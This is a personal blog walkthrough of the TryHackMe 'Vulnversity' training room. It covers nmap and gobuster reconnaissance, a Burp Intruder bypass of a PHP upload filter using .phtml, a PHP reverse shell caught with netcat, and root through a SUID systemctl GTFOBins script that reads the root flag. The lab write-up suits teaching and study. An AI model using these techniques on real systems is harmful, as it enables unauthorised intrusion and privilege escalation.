---
title: "TRYHACKME: Vulnversity Writeup"
date: 2020-02-16T02:01:58+05:30
---


#### Vulnversity:
***
***
My first impressions of this tryhackme box is that it looks like a simple and straightforward guided hackthebox activity (rated beginner) and should not take that long. `(edit: I regret saying this initally, and oh how I was so wrong)`
***
***
#### Task 0.5: Setting up Tryhackme
**Connecting to Kali on openvpn**

Download the VPN config file on tryhackme.com/acesss:

- `sudo apt install openvpn && sudo openvpn /path-to-file/file-name.ovpn &`

#### **Task 1:** Connect to Tryhackme
**By joining their room and to also deploy their machine.**

![untitled1](/vulnversity/vuln0.png)

![untitled1](/vulnversity/vuln1.png)

![untitled1](/vulnversity/vuln2.png)

Hence, we are given an hour before this active machine expires, so lets get cracking!

(if you need more time, don't hesitate to `add 1 hour` to keep the server running)

---

---


#### **Task 2: Reconnaissance**

First let's head over to our Kali Linux VM and use a network scanning tool called `Nmap`

![untitled1](/vulnversity/vuln3.png)

With the provided cheatsheet, you are able to answer the questions provided in the room. In this instance, since most questions revolve around `version checks` and `number of ports`  , the first command we should generally use is:

- `nmap -sV <machine-ip>`

![untitled1](/vulnversity/vuln4.png)

Answer the questions under task 2 by using the gathered information from the current scan and also through testing other Nmap flag commands to find open ports + enabling OS/version detections and many more, i.e: play around with different commands! (trial and error).

`example solved question would be: find the number of open ports`

From research online : An open port is described as `The target port actively responds to TCP/UDP/SCTP requests`

Once again, an explanation on the flag:

- `Pn:` Just scan for open ports
- `-p-` 10000: Scan first 10000 ports
- `-A:` Enable OS detection, execute in-build script
- `-v:` Verbose mode (Displaying all the scanning processes and results)
- Determine how many ports there are in total using `nmap -p-` (my kali crashes after this idk why?)
- Nmap questions were fairly straightforward but I had difficulty scanning open ports with `nmap -sV`

![untitled1](/vulnversity/vuln5.png)

- First attempt only showed 4 open ports which wasn't the right answer so I rebooted Kali Linux and restarted the VPN service then entered `nmap -sV 10.10.202.192`

![untitled1](/vulnversity/vuln6.png)

- As you can see, there are 6 open ports
- And you can also see the squid version as well!
- And you can also find Apache which is the running web server
- `man nmap` to view different flags

![untitled1](/vulnversity/vuln7.png)

- For OS detection/services you can use `nmap -A <machine ip>`

Once complete, we can move onto the next task.

#### **Task 3: Locating directories using GoBuster**

1. Run Gobuster with a wordlist:
- `gobuster dir -u http://10.10.188.177:3333 -w /usr/share/wordlists`
- If I follow this path, it'll say gobuster command not found
- After a few trial and error rounds, I had a read of walkthrough because I was feeling pretty confused

![untitled1](/vulnversity/vuln8.png)

- I found out that you can use: `-s`to specify the port number and `-t` and a number to use more threads
- `gobuster dir -u [http://10.10.24.120:3333](http://10.10.24.120:3333/) -t 50 -s 301 -w /usr/share/dirbuster/wordlists/directory-list-1.0.txt`
- `Status code: 301`is a "HTTP response status code `301 Moved Permanently` is used for permanent URL redirection, meaning current links or records using the URL that the response is received for should be updated."s
- `dirbuster/wordlists/directory-list-1.0.txt` was the first wordlists file (and it was also following along the walkthrough I read), so it was natural to attempt to brute force that file
- And... Viola! We founda a directory in `directory-list-1.0.txt` called `/internal/`

![untitled1](/vulnversity/vuln9.png)

![untitled1](/vulnversity/vuln10.png)

2. Now, all we need to is access that webpage...

- Go to a browser window —> enter `http://10.10.24.120`

![untitled1](/vulnversity/vuln11.png)

- And as you can see, if you add `/internal/` after the port number, you will get an upload form webpage!

---

---

#### Task 4: Compromise the webserver

1. By uploading a few file extensions onto the webserver manually, I found out that the main common extension the web server does not accept is `.php files.`PHP files are the most common file extensions used to execute the payload on the webserver. In this case, thiss blocked by the server and we have to come up with a workaround (potential exploit!)
2. Next we need to load up `burpsuite` on Kali Linux. —> look up Max's video on how to setup proxy on your Kali Linux machine [here]((/images/maxburp.mp4).
3. We need to use Intruder to automate customised attacks
    - But first we need to setup a wordlist with certain extensions within the file
    - I navigated to the /tmp file in the file system `/tmp`
        - I used `nano phpext.txt` to create a new text file added the following extensions: `php` `php3` `php4` `php5` `phtml` and `cat` to view the contexts of the txt file

        ![untitled1](/vulnversity/vuln12.png)

4. Now we need to make sure `BurpSuite` is intercepting traffic.
    - I went onto the webpage and made sure FoxyProxy is switched to BurpSuite proxy and went to the upload form page at [`http://10.10.140.243:3333/internal/`](http://10.10.140.243:3333/internal/)
        - Then, I turned my BurpSuite to intercept the website and as soon as I uploaded my `phpext.txt` file onto the server, I saw information flooding to the intercept tab:

            ![untitled1](/vulnversity/vuln13.png)

            ![untitled1](/vulnversity/vuln14.png)

            Then, i forwarded all the information to the intruder at the top left:

            ![untitled1](/vulnversity/vuln15.png)

            Once request is captured then, I clicked on "Payloads" and selected the "Sniper" attack type.

            Change the target ip to your machine ip with the proxy as 3333

            Then, I changed the target host to machine ip and I also added the symbol at the end of the file name as instructed on [tryhackme]([https://tryhackme.com/room/vulnversity](https://tryhackme.com/room/vulnversity)) and then finally started the attack

            ![untitled1](/vulnversity/vuln16.png)

            And as you can see from the screenshot below, the attack has finished and we can view one of the requests and see from `line 4` that this web server can accept HTML suffixes so thus, if we recall back to the extensions we added to our .txt file in the beginning, the only sufficient file would be `.phtml` file.

            `Note:` that host IP has changed because I had to add another hour to continue working in the room, thus changing the machine's IP address as well.

            ![untitled1](/vulnversity/vuln17.png)

    5. Reverse PHP Shell:

    - By definition: `A reverse shell works by being called on the remote host and forcing this host to make a connection to you. So you'll listen for incoming connections, upload and have your shell executed which will beacon out to you to control!`
    - Download the sample php file [here]([https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)) and rename the extension to: `.pthml`

        ![untitled1](/vulnversity/vuln18.png)

    - I now listen to incoming connections using `netcat`. Run the following command: `nc -lvnp 1234`
    - `netcat`manages networks and monitor the flow of traffic data between systems
    - Before:

        ![untitled1](/vulnversity/vuln19.png)

    - After uploading shell onto [`http://10.10.236.203:3333/internal/`](http://10.10.236.203:3333/internal/index.php):

    ![untitled1](/vulnversity/vuln20.png)

    - After navigating to `10.10.236.203:3333/internal/uploads/php-reverse-shell.phtml -`
        - First attempt failed as i did not include the `-` after .phtml:

            ![untitled1](/vulnversity/vuln21.png)

        - 2nd attempt failed even though every command was correct with no syntax errors:

            ![untitled1](/vulnversity/vuln22.png)

        - 3rd time lucky?
            - Only worked because someone didn't remember to edit the `.phtml` file and changed the ip to my tryhackme `tun0` ip which is my internal server ip
            - Netcat finally decided to display something after I changed that

            ![untitled1](/vulnversity/vuln23.png)

            Did some research on how to navigate netcat and found that I am actually in the file system and can use `ls` to show all files

            I then did some digging around and found that the `/home` directory has a user and has .txt file (hint hint)

            Now we have comprimised this machine!!

            ![untitled1](/vulnversity/vuln24.png)

---

---

#### Task 5: Privilege Escalation:

- From the description:
    - *SUID (set owner userId upon execution) is a special type of file permission given to a file. SUID gives temporary permissions to a user to run the program/file with the permission of the file owner (rather than the user who runs it).*

        ![untitled1](/vulnversity/vuln25.png)

- I did some research and found that: `find / -user root -perm -4000 -exec ls -ldb {} \;` allows you to find all SUID files on Linux:
    - From that, I found out that most files under `/usr/bin` do not have `permission denied` after their file extension. Thus, since this task requires us to find where the SUID files are, I had to do some research online and found that:
    - **SUID is a special file permission for executable files which enables other users to run the file with effective permissions of the file owner**
    - **The file that stands out is a file which was also created recently (also a good indication):**
    - Under the /bin directory, there is a file called systemctl. Systemctl is a control interface and inspection tool to manage services. Therefore if we can locate this folder, get access into it and then add a script inside, we can escalate our privileges!
    ![untitled1](/vulnversity/vuln26.png)

    Final task was to get root access, and this was very challenging

    - First I was recommended to get out [gtfobins]([https://gtfobins.github.io/gtfobins/systemctl/](https://gtfobins.github.io/gtfobins/systemctl/)) and look up what is systemctl and how to execute a SUID backdoor
    - After an in-depth read and searching through guides elsewhere, I followed these steps:
    1. Move into the bin directory `cd /bin`
    2. Open a shell within the /bin directory with `sh`
    3. Copy the template script into the shell:

        `TF=$(mktemp).service
        echo '[Service]
        Type=oneshot
        ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output"
        [Install]
        WantedBy=multi-user.target' > $TF
        ./systemctl link $TF
        ./systemctl enable --now $TF`

    ![untitled1](/vulnversity/vuln27.png)

    4.  Now, use `cat /tmp/output` to print out the temporary flag output

    ![untitled1](/vulnversity/vuln28.png)

    AND `VOILA!` We have finished our challenge and achieved our final flag for this challenge!

    ![untitled1](/vulnversity/vuln29.png)

    Compared to my intial impressions of this tryhackme box, it definitely has changed since my intnial impression, which was that tryhack was a simple and straightforward guided hackthebox activity, however, the flags became more and more difficult to obtain, forcing me to do more in-depth research (especially about SUID and SUDO backdoors on gtfobins).

    Heaps more to come :)

    — D Y L A N
